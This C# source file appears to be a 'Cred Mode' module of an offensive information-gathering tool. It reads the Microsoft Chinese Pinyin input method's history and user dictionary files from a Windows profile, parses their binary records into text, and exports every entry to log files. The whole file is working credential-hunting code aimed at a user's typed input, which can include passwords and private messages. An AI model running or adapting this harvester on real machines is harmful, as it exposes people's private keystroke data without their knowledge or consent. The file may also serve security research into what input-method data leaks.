using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    public class ChinesePinyinCredCommand : ICommand
    {
        public struct PinyinInfo
        {
            public string Source;
            public string Content;
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting user input data saved by Microsoft Chinese Pinyin Input Method.");
            GetChinesePinyinCred();
        }

        public static bool CheckChinesePinyinCredExists()
        {
            string pinyinPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
                                            "Microsoft\\InputMethod\\Chs");
            if (!Directory.Exists(pinyinPath))
            {
                return false;
            }

            try
            {
                // 检查是否存在输入法词库文件
                string ihPath = Path.Combine(pinyinPath, "ChsPinyinIH.dat");
                string udlPath = Path.Combine(pinyinPath, "ChsPinyinUDL.dat");
                
                return File.Exists(ihPath) || File.Exists(udlPath);
            }
            catch
            {
                return false;
            }
        }

        public static void GetChinesePinyinCred()
        {
            Logger.TaskHeader("Hunting Microsoft Chinese Pinyin", 1);
            
            string pinyinPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
                                           "Microsoft\\InputMethod\\Chs");
            
            if (!Directory.Exists(pinyinPath))
            {
                Logger.WriteLine("[-] Microsoft Chinese Pinyin Input Method data directory not found.");
                return;
            }

            string ihPath = Path.Combine(pinyinPath, "ChsPinyinIH.dat");
            string udlPath = Path.Combine(pinyinPath, "ChsPinyinUDL.dat");
            
            Logger.WriteLine($"[*] Checking for Microsoft Chinese Pinyin Input Method data files in:");
            Logger.WriteLine($"    {pinyinPath}");
            
            List<PinyinInfo> ihEntries = new List<PinyinInfo>();
            List<PinyinInfo> udlEntries = new List<PinyinInfo>();
            
            // 提取输入历史数据
            if (File.Exists(ihPath))
            {
                Logger.WriteLine($"[+] Found ChsPinyinIH.dat (Input History)");
                ihEntries = ExtractIHData(ihPath);
            }
            else
            {
                Logger.WriteLine($"[-] ChsPinyinIH.dat not found");
            }
            
            // 提取用户自定义词库数据
            if (File.Exists(udlPath))
            {
                Logger.WriteLine($"[+] Found ChsPinyinUDL.dat (User Defined Lexicon)");
                udlEntries = ExtractUDLData(udlPath);
            }
            else
            {
                Logger.WriteLine($"[-] ChsPinyinUDL.dat not found");
            }

            // 合并所有条目
            List<PinyinInfo> allEntries = new List<PinyinInfo>();
            allEntries.AddRange(ihEntries);
            allEntries.AddRange(udlEntries);

            // 输出提取的数据
            if (allEntries.Count > 0)
            {
                // 创建输出目录
                string outputDir = Path.Combine(Logger.globalLogDirectory, "ChinesePinyin");
                Directory.CreateDirectory(outputDir);
                
                // 导出所有数据到一个文件
                string allEntriesFile = Path.Combine(outputDir, "ChinesePinyin_All_Entries.txt");
                StringBuilder sbAll = new StringBuilder();
                sbAll.AppendLine($"Microsoft Chinese Pinyin Input Method User Data - Total: {allEntries.Count} entries");
                sbAll.AppendLine("===========================================================");
                
                foreach (var entry in allEntries)
                {
                    sbAll.AppendLine($"[{entry.Source}] {entry.Content}");
                }
                
                File.WriteAllText(allEntriesFile, sbAll.ToString(), Encoding.UTF8);
                
                // 分别导出IH和UDL数据到各自的文件
                if (ihEntries.Count > 0)
                {
                    string ihEntriesFile = Path.Combine(outputDir, "ChinesePinyin_InputHistory.txt");
                    StringBuilder sbIH = new StringBuilder();
                    sbIH.AppendLine($"Microsoft Chinese Pinyin Input History Data - Total: {ihEntries.Count} entries");
                    sbIH.AppendLine("===========================================================");
                    
                    foreach (var entry in ihEntries)
                    {
                        sbIH.AppendLine(entry.Content);
                    }
                    
                    File.WriteAllText(ihEntriesFile, sbIH.ToString(), Encoding.UTF8);
                }
                
                if (udlEntries.Count > 0)
                {
                    string udlEntriesFile = Path.Combine(outputDir, "ChinesePinyin_UserDictionary.txt");
                    StringBuilder sbUDL = new StringBuilder();
                    sbUDL.AppendLine($"Microsoft Chinese Pinyin User Dictionary Data - Total: {udlEntries.Count} entries");
                    sbUDL.AppendLine("===========================================================");
                    
                    foreach (var entry in udlEntries)
                    {
                        sbUDL.AppendLine(entry.Content);
                    }
                    
                    File.WriteAllText(udlEntriesFile, sbUDL.ToString(), Encoding.UTF8);
                }
                
                Logger.WriteLine($"[+] Chinese Pinyin data exported to directory: {outputDir}");
                
                // 控制台显示限制为最多50条
                Logger.WriteLine($"\n[+] Found {allEntries.Count} user input entries (displaying up to 50):");
                List<PinyinInfo> displayEntries = allEntries.Take(50).ToList();
                Logger.PrintTableFromStructs(displayEntries);
                
                if (allEntries.Count > 50)
                {
                    Logger.WriteLine($"[*] {allEntries.Count - 50} more entries are available in the exported files.");
                }
            }
            else
            {
                Logger.WriteLine("[-] No valid input data found.");
            }
        }

        private static List<PinyinInfo> ExtractIHData(string filePath)
        {
            List<PinyinInfo> results = new List<PinyinInfo>();
            
            try
            {
                // 读取文件并跳过头部数据(5120字节)
                byte[] data = File.ReadAllBytes(filePath);
                data = data.Skip(5120).ToArray();
                
                // 每60字节一个记录
                int blockSize = 60;
                int blockIndex = 1;
                
                while (blockIndex * blockSize < data.Length)
                {
                    try
                    {
                        int offset = blockIndex * blockSize;
                        if (offset + 12 >= data.Length) break;
                        
                        // 获取长度值
                        int dataLength = data[offset];
                        if (dataLength == 0 || offset + 12 + (dataLength * 2) > data.Length) break;
                        
                        // 提取Unicode文本
                        byte[] textBytes = new byte[dataLength * 2];
                        Array.Copy(data, offset + 12, textBytes, 0, dataLength * 2);
                        string content = Encoding.Unicode.GetString(textBytes);
                        
                        // 只添加非空内容
                        if (!string.IsNullOrWhiteSpace(content))
                        {
                            results.Add(new PinyinInfo
                            {
                                Source = "Input History (IH)",
                                Content = content
                            });
                        }
                        
                        blockIndex++;
                    }
                    catch (Exception ex)
                    {
                        Logger.WriteLine($"[-] Error processing IH entry: {ex.Message}");
                        break;
                    }
                }
                
                Logger.WriteLine($"[+] Extracted {results.Count} entries from Input History data");
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading Input History file: {ex.Message}");
            }
            
            return results;
        }

        private static List<PinyinInfo> ExtractUDLData(string filePath)
        {
            List<PinyinInfo> results = new List<PinyinInfo>();
            
            try
            {
                // 读取文件并跳过头部数据(9216字节)
                byte[] data = File.ReadAllBytes(filePath);
                data = data.Skip(9216).ToArray();
                
                // 每60字节一个记录
                int blockSize = 60;
                int blockIndex = 1;
                
                while (blockIndex * blockSize < data.Length)
                {
                    try
                    {
                        int offset = blockIndex * blockSize;
                        if (offset + 12 >= data.Length) break;
                        
                        // 在偏移+10的位置获取长度
                        int dataLength = data[offset + 10];
                        if (dataLength == 0 || offset + 12 + (dataLength * 2) > data.Length) break;
                        
                        // 提取Unicode文本
                        byte[] textBytes = new byte[dataLength * 2];
                        Array.Copy(data, offset + 12, textBytes, 0, dataLength * 2);
                        string content = Encoding.Unicode.GetString(textBytes);
                        
                        // 只添加非空内容
                        if (!string.IsNullOrWhiteSpace(content))
                        {
                            results.Add(new PinyinInfo
                            {
                                Source = "User Lexicon (UDL)",
                                Content = content
                            });
                        }
                        
                        blockIndex++;
                    }
                    catch (Exception ex)
                    {
                        Logger.WriteLine($"[-] Error processing UDL entry: {ex.Message}");
                        break;
                    }
                }
                
                Logger.WriteLine($"[+] Extracted {results.Count} entries from User Defined Lexicon data");
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading User Defined Lexicon file: {ex.Message}");
            }
            
            return results;
        }
    }
} 